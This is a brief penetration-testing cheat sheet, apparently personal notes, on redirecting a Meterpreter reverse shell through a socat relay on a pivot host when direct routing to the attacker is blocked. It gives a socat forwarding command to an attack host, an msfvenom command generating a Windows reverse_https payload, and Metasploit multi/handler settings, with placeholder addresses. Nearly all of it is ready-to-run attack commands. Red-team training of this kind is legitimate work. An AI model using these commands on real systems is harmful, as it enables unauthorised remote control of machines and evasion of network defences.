## Socat Reverse Shell Redirection

Direct routing to `<ATTACK_IP>` is blocked but the target can reach `<PIVOT_IP>`. **Socat** acts as a bidirectional relay between the target and the attack host listener without requiring SSH tunneling.

Establish a listener on the pivot host to fork and forward traffic to the attack host

```
socat TCP4-LISTEN:<PORT>,fork TCP4:<ATTACK_IP>:<PORT>
```

Generate a payload that calls back to the redirector IP and port on the pivot host

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> -f exe -o <FILE_PATH> LPORT=<PORT>
```

Configure the multi-handler on the attack host to receive the redirected session

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport <PORT>
run
```

- Socat
    
    - `socat TCP4-LISTEN:<PORT>,fork TCP4:<ATTACK_IP>:<PORT>`
    - Prefer when SSH is unavailable or a simple bidirectional pipe is required.
- **Payload UUID tracking** fails silently if the Metasploit database is not connected.